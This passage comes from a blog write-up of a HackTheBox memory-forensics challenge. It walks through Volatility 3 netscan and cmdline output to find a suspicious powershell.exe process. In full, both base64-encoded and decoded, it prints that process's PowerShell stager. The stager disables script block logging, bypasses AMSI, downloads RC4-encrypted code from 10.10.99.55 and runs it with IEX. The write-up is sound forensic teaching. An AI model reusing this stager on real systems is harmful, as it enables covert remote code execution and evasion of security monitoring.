+0x1e909010      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
+0x1ec304b0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
+0x1ed592b0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
+0x1ee7cd20      TCPv4   0.0.0.0 <span style="color:#ae81ff">49152</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">376</span>     wininit.exe     -
+0x1eec14e0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
+0x1eec14e0      UDPv6   ::      <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
+0x1f1ea4f0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
+0x1f1ea4f0      UDPv6   ::      <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
+0x1f6c1010      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
+0x1f6c1010      UDPv6   ::      <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
+0x1f6c2ec0      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
+0x1fc04010      TCPv6   -       <span style="color:#ae81ff">0</span>       6890:8300:80fa:ffff:6890:8300:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  N/A
+0x1fc04490      TCPv4   10.10.100.43    <span style="color:#ae81ff">49246</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
+0x1fc15010      TCPv6   ::1     <span style="color:#ae81ff">2869</span>    ::1     <span style="color:#ae81ff">49237</span>   ESTABLISHED     <span style="color:#ae81ff">4</span>       System  N/A
+0x1fc3d320      TCPv4   10.10.100.43    <span style="color:#ae81ff">49247</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
+0x1fc769d0      TCPv4   127.0.0.1       <span style="color:#ae81ff">49232</span>   127.0.0.1       <span style="color:#ae81ff">49231</span>   ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
+0x1fc76cf0      TCPv4   127.0.0.1       <span style="color:#ae81ff">49231</span>   127.0.0.1       <span style="color:#ae81ff">49232</span>   ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
+0x1fc85010      UDPv6   fe80::6cee:b5c1:4a75:f04b       <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
+0x1fc8e680      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
+0x1fc8e680      UDPv6   ::      <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
+0x1fc99db0      TCPv4   0.0.0.0 <span style="color:#ae81ff">554</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    -
+0x1fcc2b80      TCPv4   0.0.0.0 <span style="color:#ae81ff">2869</span>    0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1fcc2b80      TCPv6   ::      <span style="color:#ae81ff">2869</span>    ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1fcc8010      TCPv6   ::1     <span style="color:#ae81ff">49237</span>   ::1     <span style="color:#ae81ff">2869</span>    ESTABLISHED     <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    N/A
+0x1fcdbec0      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">664</span>     VBoxService.ex  2017-10-04 18:06:56.000000
+0x1fcf4940      TCPv4   10.10.100.43    <span style="color:#ae81ff">49233</span>   10.10.20.166    <span style="color:#ae81ff">143</span>     ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
+0x1fd01780      TCPv4   0.0.0.0 <span style="color:#ae81ff">10243</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1fd01780      TCPv6   ::      <span style="color:#ae81ff">10243</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
+0x1fd9a3e0      TCPv4   0.0.0.0 <span style="color:#ae81ff">554</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    -
+0x1fd9a3e0      TCPv6   ::      <span style="color:#ae81ff">554</span>     ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    -
+0x1fdb3630      TCPv4   10.10.100.43    <span style="color:#ae81ff">49236</span>   10.10.20.166    <span style="color:#ae81ff">143</span>     ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
+</code></pre></div><p>What stood out to me was these line:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0x1fc04490      TCPv4   10.10.100.43    <span style="color:#ae81ff">49246</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
+0x1fc3d320      TCPv4   10.10.100.43    <span style="color:#ae81ff">49247</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
+</code></pre></div><p>Even though these connections were closed, there are some alarming signs:</p>
+<ol>
+<li>That there is <code>powershell.exe</code>, even though it might be benign, it is possible that this might be used for setting up reverse shell.</li>
+<li>That there is communication with port &ldquo;80&rdquo; using <code>powershell.exe</code>. This stoods out because a normal user (who is not that techsavvy) won&rsquo;t use &ldquo;powershell.exe&rdquo; to communicate with a website.</li>
+</ol>
+<p>Let&rsquo;s dump out the command that would&rsquo;ve been used to call <code>powershell.exe</code> to investigate.</p>
+<p><strong>Getting command run by using <code>windows.cmdline</code></strong></p>
+<ul>
+<li>We can get all the commands that were used to run the process using the command:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline
+</code></pre></div><ul>
+<li>But to only get the command of a particular process, we can use PID with <code>--pid</code> flag</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.cmdline --pid <span style="color:#ae81ff">2752</span>                                                                                                                                            <span style="color:#ae81ff">2</span> ⨯
+Volatility <span style="color:#ae81ff">3</span> Framework 1.0.0
+Progress:  100.00               PDB scanning finished
+PID     Process Args
+
+<span style="color:#ae81ff">2752</span>    powershell.exe  <span style="color:#e6db74">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> -noP -sta -w <span style="color:#ae81ff">1</span> -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA<span style="color:#f92672">=</span>
+</code></pre></div><p>So <code>powershell.exe</code> is called with <code>-enc</code> command which uses base64 encoding.</p>
+<p>On decoding this encoding:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo -n JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA<span style="color:#f92672">=</span> |base64 -d
+
+$GroUPPOLiCYSEttINGs <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>rEF<span style="color:#f92672">]</span>.ASseMBLY.GEtTypE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;System.Management.Automation.Utils&#39;</span><span style="color:#f92672">)</span>.<span style="color:#e6db74">&#34;GEtFIE`ld&#34;</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cachedGroupPolicySettings&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>+<span style="color:#e6db74">&#39;onPublic,Static&#39;</span><span style="color:#f92672">)</span>.GETValUe<span style="color:#f92672">(</span>$nulL<span style="color:#f92672">)</span>;$GRouPPOlICySeTTiNgS<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ScriptB&#39;</span>+<span style="color:#e6db74">&#39;lockLogging&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;EnableScriptB&#39;</span>+<span style="color:#e6db74">&#39;lockLogging&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0;$GRouPPOLICYSEtTingS<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ScriptB&#39;</span>+<span style="color:#e6db74">&#39;lockLogging&#39;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#39;EnableScriptBlockInvocationLogging&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> 0;<span style="color:#f92672">[</span>Ref<span style="color:#f92672">]</span>.AsSemBly.GeTTyPE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color:#f92672">)</span>|?<span style="color:#f92672">{</span>$_<span style="color:#f92672">}</span>|%<span style="color:#f92672">{</span>$_.GEtFieLd<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;amsiInitFailed&#39;</span>,<span style="color:#e6db74">&#39;NonPublic,Static&#39;</span><span style="color:#f92672">)</span>.SETVaLuE<span style="color:#f92672">(</span>$NulL,$True<span style="color:#f92672">)}</span>;<span style="color:#f92672">[</span>SysTem.NeT.SErVIcePOIntMAnAgER<span style="color:#f92672">]</span>::ExpEct100COnTinuE<span style="color:#f92672">=</span>0;$WC<span style="color:#f92672">=</span>NEW-OBjEcT SysTEM.NEt.WeBClIEnt;$u<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>;$wC.HeaDerS.Add<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;User-Agent&#39;</span>,$u<span style="color:#f92672">)</span>;$Wc.PRoXy<span style="color:#f92672">=[</span>SysTeM.NET.WebRequEst<span style="color:#f92672">]</span>::DefaULtWeBPROXY;$wC.PRoXY.CREDeNtIaLS <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>SYSTeM.NET.CreDEnTiaLCaChe<span style="color:#f92672">]</span>::DeFauLTNEtwOrkCredentiAlS;$K<span style="color:#f92672">=[</span>SYStEM.Text.ENCODIng<span style="color:#f92672">]</span>::ASCII.GEtBytEs<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;E1gMGdfT@eoN&gt;x9{]2F7+bsOn4/SiQrw&#39;</span><span style="color:#f92672">)</span>;$R<span style="color:#f92672">={</span>$D,$K<span style="color:#f92672">=</span>$ArgS;$S<span style="color:#f92672">=</span>0..255;0..255|%<span style="color:#f92672">{</span>$J<span style="color:#f92672">=(</span>$J+$S<span style="color:#f92672">[</span>$_<span style="color:#f92672">]</span>+$K<span style="color:#f92672">[</span>$_%$K.CounT<span style="color:#f92672">])</span>%256;$S<span style="color:#f92672">[</span>$_<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$J<span style="color:#f92672">]=</span>$S<span style="color:#f92672">[</span>$J<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$_<span style="color:#f92672">]}</span>;$D|%<span style="color:#f92672">{</span>$I<span style="color:#f92672">=(</span>$I+1<span style="color:#f92672">)</span>%256;$H<span style="color:#f92672">=(</span>$H+$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">])</span>%256;$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$H<span style="color:#f92672">]=</span>$S<span style="color:#f92672">[</span>$H<span style="color:#f92672">]</span>,$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">]</span>;$_-bxoR$S<span style="color:#f92672">[(</span>$S<span style="color:#f92672">[</span>$I<span style="color:#f92672">]</span>+$S<span style="color:#f92672">[</span>$H<span style="color:#f92672">])</span>%256<span style="color:#f92672">]}}</span>;$wc.HEAdErs.ADD<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Cookie&#34;</span>,<span style="color:#e6db74">&#34;session=MCahuQVfz0yM6VBe8fzV9t9jomo=&#34;</span><span style="color:#f92672">)</span>;$ser<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://10.10.99.55:80&#39;</span>;$t<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/login/process.php&#39;</span>;$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HTB{$_j0G_********0rY_$}&#39;</span>;$DatA<span style="color:#f92672">=</span>$WC.DoWNLoaDDATA<span style="color:#f92672">(</span>$SeR+$t<span style="color:#f92672">)</span>;$iv<span style="color:#f92672">=</span>$daTA<span style="color:#f92672">[</span>0..3<span style="color:#f92672">]</span>;$DAta<span style="color:#f92672">=</span>$DaTa<span style="color:#f92672">[</span>4..$DAta.LenGTH<span style="color:#f92672">]</span>;-JOIN<span style="color:#f92672">[</span>CHAr<span style="color:#f92672">[]](</span>&amp; $R $datA <span style="color:#f92672">(</span>$IV+$K<span style="color:#f92672">))</span>|IEX
+</code></pre></div><p>We get the flag!</p>
+<hr>
+<p>This was rather a very simple forensics challenge but I enjoyed it a lot. If you&rsquo;re new to using forensics tool like volatility, this is a simple challenge to get oneself accustomed to it.</p>
+<h4 id="now-let-me-shamelessly-ask-you-to">Now, let me shamelessly ask you to</h4>
+<p>Follow me on <a href="https://github.com/harshitm98">Github</a>, <a href="https://twitter.com/fake_batman_">Twitter</a>, and connect on <a href="https://linkedin.com/in/harshitm98">LinkedIn</a>.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://harshitm98.github.io/tags/hackthebox/">hackthebox</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/challenges/">challenges</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/forensics/">forensics</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/volatility/">volatility</a></span>
+        <span class="tag"><a href="https://harshitm98.github.io/tags/writeup/">writeup</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
